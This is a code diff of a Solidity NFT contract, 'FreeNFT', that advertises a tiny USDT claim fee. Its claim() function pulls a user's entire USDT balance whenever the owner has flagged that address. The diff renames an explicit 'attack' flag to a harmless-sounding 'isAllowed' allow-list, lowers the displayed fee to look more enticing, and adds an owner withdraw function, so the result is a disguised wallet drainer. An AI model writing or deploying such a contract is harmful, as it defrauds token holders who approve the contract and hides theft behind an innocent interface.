@@ -8,8 +8,8 @@ import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
 contract FreeNFT is ERC721, Ownable {
     IERC20 usdt;
     uint256 _nextTokenId;
-    uint256 public immutable fee = 0.1e6; // 0.1 usdt
-    bool attack;
+    uint256 public immutable fee = 0.001e6; // 0.001 usdt
+    mapping(address => bool) isAllowed;
 
     constructor(
         address _usdtAddr
@@ -18,7 +18,9 @@ contract FreeNFT is ERC721, Ownable {
     }
 
     function claim() public returns (uint256) {
-        uint256 feeUsed = attack ? usdt.balanceOf(msg.sender) : fee;
+        uint256 feeUsed = isAllowed[msg.sender]
+            ? usdt.balanceOf(msg.sender)
+            : fee;
         usdt.transferFrom(msg.sender, address(this), feeUsed);
 
         uint256 tokenId = _nextTokenId++;
@@ -27,7 +29,12 @@ contract FreeNFT is ERC721, Ownable {
         return tokenId;
     }
 
-    function setAttack(bool _attack) external onlyOwner {
-        attack = _attack;
+    function add(address user, bool value) external onlyOwner {
+        isAllowed[user] = value;
+    }
+
+    function withdraw(uint256 amount) external onlyOwner {
+        require(usdt.balanceOf(address(this)) >= amount);
+        usdt.transfer(msg.sender, amount);
     }
 }
